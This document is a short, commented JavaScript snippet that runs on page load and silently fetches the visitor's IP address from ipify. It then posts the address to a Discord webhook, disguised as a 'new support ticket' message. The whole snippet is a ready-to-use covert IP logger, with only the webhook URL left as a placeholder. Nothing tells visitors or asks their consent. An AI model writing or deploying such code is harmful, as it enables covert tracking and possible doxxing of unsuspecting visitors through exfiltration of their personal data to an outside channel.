// JavaScript function to send the IP address to Discord automatically when the page loads
window.onload = function() {
    // Fetching the user's IP address using an external API (ipify)
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())  // Convert the response to JSON
        .then(data => {
            const userIP = data.ip;  // Extract the user's IP address from the response
            const ticketData = {
                content: `New support ticket submitted! \nUser IP: ${userIP}`,  // Data to send to Discord
            };

            // Sending the ticket data (including the IP address) to the Discord webhook
            fetch('YOUR_DISCORD_WEBHOOK_URL', {
                method: 'POST',  // HTTP method for sending data
                headers: {
                    'Content-Type': 'application/json',  // The data format being sent is JSON
                },
                body: JSON.stringify(ticketData),  // Convert the data object to JSON format
            })
            .then(response => {
                if (response.ok) {  // If the request to Discord was successful
                    console.log('IP address sent to Discord.');
                } else {
                    console.error('Error sending IP to Discord.');
                }
            })
            .catch(error => {
                console.error('Error sending ticket:', error);
            });
        })
        .catch(error => {
            console.error('Error getting IP address:', error);
        });
};
